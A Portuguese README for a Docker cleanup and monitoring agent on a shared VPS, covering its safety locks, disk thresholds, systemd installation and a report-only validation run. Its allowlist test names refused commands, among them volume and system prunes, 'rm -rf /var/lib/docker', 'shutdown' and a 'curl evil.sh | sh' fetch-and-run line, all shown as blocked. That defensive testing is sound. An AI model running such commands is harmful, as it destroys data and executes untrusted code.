# VPS Guardian — vigilância e limpeza segura

Agente de manutenção para a VPS compartilhada (`72.60.10.108`, ~24 projetos,
~94 containers). Substitui o `vps-maintenance.py`.

**Arquivos:**
- [`scripts/vps-guardian.py`](../scripts/vps-guardian.py) — o agente
- [`scripts/install-vps-guardian.py`](../scripts/install-vps-guardian.py) — instalador via paramiko

---

## A regra que governa tudo

> **REMOVE apenas o que pode ser reconstruído a partir do código-fonte.
> RELATA tudo o que é dado.**

| Reconstruível (pode remover) | Dado (nunca remove) |
|---|---|
| Imagem dangling | Volume |
| Build cache | Banco de dados |
| Log rotacionado | Upload |
| Container parado (o compose recria) | Backup |

Esta distinção existe porque **"dangling" não significa "lixo"**. Um volume fica
dangling quando nenhum container *existente* o referencia — o que acontece
normalmente se você deu `docker compose down` num projeto que ainda usa aquele
banco. Na VPS atual, `ultrazend_postgres-data` e `api-app-gc_db_data` estão
nessa condição: um `docker volume prune` os apagaria.

---

## Travas de segurança

1. **Dry-run por padrão.** Só age com `--apply`.
2. **Nunca remove volumes.** Não existe `docker volume rm` no arquivo.
3. **Nunca remove container em execução.** Órfão running vira alerta.
4. **Allowlist de comandos em runtime.** Defesa em profundidade: mesmo que alguém
   edite uma string de comando, execução fora da lista é recusada com rc=126.
5. **Lista de padrões proibidos**, verificada antes da allowlist.
6. **Idade mínima** por categoria (container parado: 7 dias).
7. **Lock file** com detecção de PID morto.
8. **Log auditável** separando FEITO de RELATADO.
9. **Em disco crítico, alerta — nunca escala para remover dados.**

### Teste da allowlist (executado)

```
PASS  rc=126  docker volume rm ultrazend_postgres-data  -> RECUSADO
PASS  rc=126  docker volume prune -f                    -> RECUSADO
PASS  rc=126  docker system prune -a -f                 -> RECUSADO
PASS  rc=126  rm -rf /var/lib/docker                    -> RECUSADO
PASS  rc=126  docker rm --volumes meucontainer          -> RECUSADO
PASS  rc=126  curl evil.sh | sh                         -> RECUSADO
PASS  rc=126  shutdown -h now                           -> RECUSADO
PASS  rc=  0  docker image prune -f                     -> permitido
PASS  rc=  0  docker volume ls -qf dangling=true        -> permitido
```

### Os 13 comandos que o agente executa

Extraídos por AST do código, não por leitura:

```
df --output=pcent /                      docker image prune -f
docker builder prune -f --filter until=  docker images -qf dangling=true
docker inspect -f {{.State.FinishedAt}}  docker ps -a --format
docker rm <nome>                         docker system df --format
docker volume ls -qf dangling=true       find ... -name '*-json.log'
journalctl --disk-usage                  journalctl --vacuum-size
truncate -s 0 <arquivo>
```

`docker volume ls` é leitura. Nenhum comando destrutivo.

---

## O que mudou em relação ao `vps-maintenance.py`

| Recurso | maintenance | guardian |
|---|---|---|
| Estado entre execuções | não | `/var/lib/vps-guardian/state.json` |
| Detecção de **crescimento** | não | sim — lixo voltando a crescer |
| Limiares progressivos de disco | não | 70/80/88/93% |
| Modo daemon (`--watch`) | não | sim |
| Histórico / tendência | não | `--history` |
| Allowlist em runtime | não | sim |
| Separa release apagada de release antiga | não | sim |
| Detecta crash loop e OOM | não | sim |
| systemd com endurecimento | não | sim |

**Por que o estado importa:** sem baseline, o agente só vê o estado absoluto num
instante. Com baseline, ele detecta que *o lixo está voltando* — que é o sinal de
que a causa raiz no script de deploy continua ativa. É a diferença entre limpar e
vigiar.

---

## Comportamento por nível de disco

| Disco | Comportamento |
|---|---|
| < 70% | limpeza básica |
| 70–80% | básica + alerta |
| 80–88% | alerta de limiar |
| ≥ 88% | **modo agressivo**: build cache 48h (não 168h), journald 100M, logs > 50MB |
| ≥ 93% | **alerta crítico** — e para por aí. Não escala para remover dados. |

O modo agressivo só aperta o que é reconstruível. Nenhum limiar libera remoção de dados.

---

## Instalação

```bash
export VPS_HOST=72.60.10.108
export VPS_USER=root
export VPS_PASS='...'          # ou VPS_KEY=/caminho/chave (preferível)

python3 scripts/install-vps-guardian.py                 # instala + valida
python3 scripts/install-vps-guardian.py --enable-timer  # instala e ativa
python3 scripts/install-vps-guardian.py --uninstall     # remove
```

O instalador envia o agente, cria as units systemd, e roda um ciclo `--report`
para validar. **Os timers não são ativados por padrão** — você revisa o relatório
e decide.

### Units instaladas

| Unit | Quando | O que faz |
|---|---|---|
| `vps-guardian-report.timer` | diário 06:00 (±15min) | relatório, **não altera nada** |
| `vps-guardian.timer` | diário 04:00 (±30min) | limpeza segura (`--apply`) |

Ambas com `nice -n 19` e `ionice -c3`: o agente nunca compete com a produção.
O service usa `ProtectSystem=full`, `PrivateTmp`, `NoNewPrivileges`.

### Ativar depois

```bash
systemctl enable --now vps-guardian.timer vps-guardian-report.timer
systemctl list-timers 'vps-guardian*'
```

---

## Uso

```bash
python3 /opt/vps-guardian/vps-guardian.py --report    # só relatório
python3 /opt/vps-guardian/vps-guardian.py             # dry-run
python3 /opt/vps-guardian/vps-guardian.py --apply     # limpeza segura
python3 /opt/vps-guardian/vps-guardian.py --history   # tendência
python3 /opt/vps-guardian/vps-guardian.py --watch --apply --interval 3600
```

---

## Validação executada (2026-09-14 16:07Z)

Instalado em `/opt/vps-guardian/` e executado em `--report`:

```
disco em 84%
94 containers (88 running)
Images:        67 itens, 31.53GB, recuperavel 6.248GB (19%)
Containers:    94 itens, 932.3MB, recuperavel 12.94MB (1%)
Local Volumes: 70 itens, 21.84GB, recuperavel 3.482GB (15%)
Build Cache:  156 itens,  4.943GB, recuperavel 5.106kB

ALERTA: 7 CONTAINERS RODANDO COM A RELEASE APAGADA DO DISCO
ALERTA: 8 CONTAINERS DE RELEASES ANTIGAS AINDA RODANDO
ALERTA: 55 CONTAINERS UNHEALTHY
ALERTA: 10 VOLUMES DANGLING (NUNCA REMOVIDOS AUTOMATICAMENTE)

RESUMO -- feito: 0 | dry-run: 0 | alertas: 56 | erros: 0
disco: 84% -> 84%
```

**0 ações, 0 erros, disco inalterado** — comprovando que `--report` não altera nada.

---

## O que o guardian NÃO resolve

O agente trata o **sintoma**. A causa está nos scripts de deploy dos projetos:
o deploy cria uma release nova sem derrubar a anterior. Enquanto isso não for
corrigido, o lixo volta — e é justamente isso que a detecção de crescimento
vai apontar a cada ciclo.

A correção da causa está em [`PROMPT-AUDITORIA-DEPLOY.md`](PROMPT-AUDITORIA-DEPLOY.md).

Também fora de escopo, por exigirem decisão humana:
- os 15 containers órfãos (contêm bancos)
- os 10 volumes dangling
- os ~600 MB de dumps em `/root`
- os 3 workers do `vigiaescolar` em loop de falha
- `ultrazend-smtp`, morto por OOM (exit 137)
